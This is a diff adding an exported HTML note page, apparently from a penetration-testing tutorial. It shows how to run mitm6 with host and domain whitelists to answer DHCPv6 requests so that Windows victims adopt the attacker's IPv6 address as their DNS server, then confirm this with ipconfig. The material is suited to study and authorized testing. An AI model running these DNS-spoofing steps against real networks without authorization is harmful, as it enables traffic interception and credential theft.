@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>1. DNS spoofing: setup IPv6 of the attacker as DNS server</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>1. DNS spoofing: setup IPv6 of the attacker as DNS server</h1><br/><strong><h3>DNS spoofing: setup IPv6 of the attacker as DNS server</h3></strong><br />Now we will use mitm6 to reply to those DHCPv6 requests and set the attacker IPv6 as the default IPv6 DNS server for the victims.<br />Note: mitm6 currently only targets Windows based operating systems, since other operating systems like macOS and Linux do not use DHCPv6 for DNS server assignment<br /><div class="codebox"><div class="codebox">root@kali:/#&nbsp;mitm6&nbsp;--host-whitelist&nbsp;&lt;hostname&gt;.&lt;FQDN&gt;&nbsp;--domain&nbsp;&lt;FQDN&gt;&nbsp;--ignore-nofqdn</div></div><br />    -hw &lt;hostname&gt;, --host-whitelist &lt;hostname&gt; → Hostname (FQDN) to filter DHCPv6 queries on (Whitelist principle, multiple can be specified.)<br />    -d &lt;DOMAIN&gt;, --domain &lt;DOMAIN&gt; → Domain name to filter DNS queries on (Whitelist principle, multiple can be specified.) <br />    --ignore-nofqdn → Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name (FQDN) option.<br />    <a href=""><img src="images/1258-1.png" alt="images/1258-1.png" /></a><br />If we can check on the target machines we can see that the IPv6 of the DNS server is been set to the one of the attacker<br /><div class="codebox"><div class="codebox">C:\&gt;&nbsp;ipconfig&nbsp;/all</div></div><br />    <a href=""><img src="images/1258-2.png" alt="images/1258-2.png" /></a><br /></div>
+</body>
+</html>
